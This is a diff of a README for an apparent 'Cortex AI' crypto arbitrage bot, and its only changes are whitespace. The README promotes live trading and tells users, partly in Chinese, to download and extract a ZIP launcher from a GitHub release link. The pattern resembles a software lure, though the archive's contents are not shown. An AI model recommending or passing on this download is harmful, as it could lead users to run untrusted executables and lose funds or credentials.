@@ -7,14 +7,14 @@
 </p>   
  
 <p align="center">
-  <img src="https://img.shields.io/badge/Status-Live_Trading-green?style=for-the-badge" alt="Status">
-  <img src="https://img.shields.io/badge/Focus-Crypto_Arbitrage-blue?style=for-the-badge" alt="Focus">
-  <img src="https://img.shields.io/badge/Network-TON_&_SOL_&_EVM-orange?style=for-the-badge" alt="Protocol">
+   <img src="https://img.shields.io/badge/Status-Live_Trading-green?style=for-the-badge" alt="Status">
+   <img src="https://img.shields.io/badge/Focus-Crypto_Arbitrage-blue?style=for-the-badge" alt="Focus">
+   <img src="https://img.shields.io/badge/Network-TON_&_SOL_&_EVM-orange?style=for-the-badge" alt="Protocol">
 </p>    
  
 <p align="center">
 <img src="Cortex-AI-Software-Arbitrage-Bot-HFT-Demo.gif" alt="Cortex AI Arbitrage Dashboard Interface">
-</p>
+ </p>
 
 <p align="center">
   <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
@@ -44,7 +44,7 @@
   <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI">
   </a>
-</p>
+ </p>
 
 * **获取软件:** 点击上方 **"DOWNLOAD"** 徽章或前往官网获取安装包。
 * **解压文件:** 将下载的 ZIP 压缩包解压至您的本地工作目录。
